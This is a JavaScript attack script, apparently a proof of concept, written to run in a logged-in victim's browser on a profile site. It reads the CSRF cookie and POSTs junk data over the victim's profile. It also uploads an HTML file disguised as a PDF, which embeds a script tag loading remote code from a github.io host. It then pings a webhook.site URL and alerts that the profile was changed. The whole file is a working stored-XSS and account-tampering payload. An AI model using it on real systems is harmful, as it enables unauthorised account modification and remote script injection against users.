
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}


const csrfToken = getCookie('csrftoken');
const endpoint = '/en/profiles/edit/'; // Dùng đường dẫn tương đối


const formData = new FormData();


formData.append('personal_email', 'attacker-test@example.com');
formData.append('address', '123 Duong Rac, Quan Rac');
formData.append('date_of_birth', '2000-01-01'); 
formData.append('phone_number', '0909123456');
formData.append('gpa', '3.0'); 
formData.append('linkedin_url', 'https://linkedin.com/in/junk-data');
formData.append('github_url', 'https://github.com/junk-data');
formData.append('self_introduction', 'Day la test data lck'); 
formData.append('career_objective', 'Test data cho career');
formData.append('portfolio_url', '');
formData.append('availability', '');


formData.append('avatar', '');

const evilPdfContent = '<script src="https://LamChanKhai.github.io/X55.github.io/script.js"></script>';
const evilCvFile = new File([evilPdfContent], 'lck.html', {
    type: 'application/pdf'
});
formData.append('cv', evilCvFile);


formData.append('projects-TOTAL_FORMS', '0');
formData.append('projects-INITIAL_FORMS', '0');
formData.append('projects-MIN_NUM_FORMS', '0');
formData.append('projects-MAX_NUM_FORMS', '1000');

formData.append('achievements-TOTAL_FORMS', '1');
formData.append('achievements-INITIAL_FORMS', '1');
formData.append('achievements-MIN_NUM_FORMS', '0');
formData.append('achievements-MAX_NUM_FORMS', '1000');
formData.append('achievements-0-id', '1'); // <-- ID của cái cũ
formData.append('achievements-0-title', 'Junk Achievement Title'); 
formData.append('achievements-0-issued_by', '');
formData.append('achievements-0-description', '');
formData.append('achievements-0-date_achieved', '');
formData.append('achievements-0-certificate_file', evilCvFile);


formData.append('languages-TOTAL_FORMS', '0');
formData.append('languages-INITIAL_FORMS', '0');
formData.append('languages-MIN_NUM_FORMS', '0');
formData.append('languages-MAX_NUM_FORMS', '1000');


formData.append('activities-TOTAL_FORMS', '0');
formData.append('activities-INITIAL_FORMS', '0');
formData.append('activities-MIN_NUM_FORMS', '0');
formData.append('activities-MAX_NUM_FORMS', '1000');


console.log('Đang gửi request với CSRF Token:', csrfToken);

fetch(endpoint, {
    method: 'POST',
    headers: {
        'X-CSRFToken': csrfToken,
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: formData
})
.then(response => {
    console.log('Phản hồi từ server (Status):', response.status, response.statusText);
    if (response.ok) {
        console.log('THÀNH CÔNG! Server đã chấp nhận.');
    } else {
        console.error('THẤT BẠI! Server từ chối.');
    }
    return response.text(); 
})
.then(html => {
    console.log('Nội dung phản hồi (HTML):', html);
    if (html.includes('errorlist')) {
        console.warn('Server trả về lỗi, kiểm tra lại các trường dữ liệu!');
    } else if (document.title.includes('Login')) {
        console.error('BỊ LOGOUT! Phiên đăng nhập hết hạn hoặc CSRF thất bại.');
    }
})
.catch(error => {
    console.error('Lỗi mạng hoặc lỗi JavaScript:', error);
});
fetch('https://webhook.site/2039e966-8e37-448b-8f25-6485def7ce17')
alert('Chan Khai da thay doi profile cua ban')
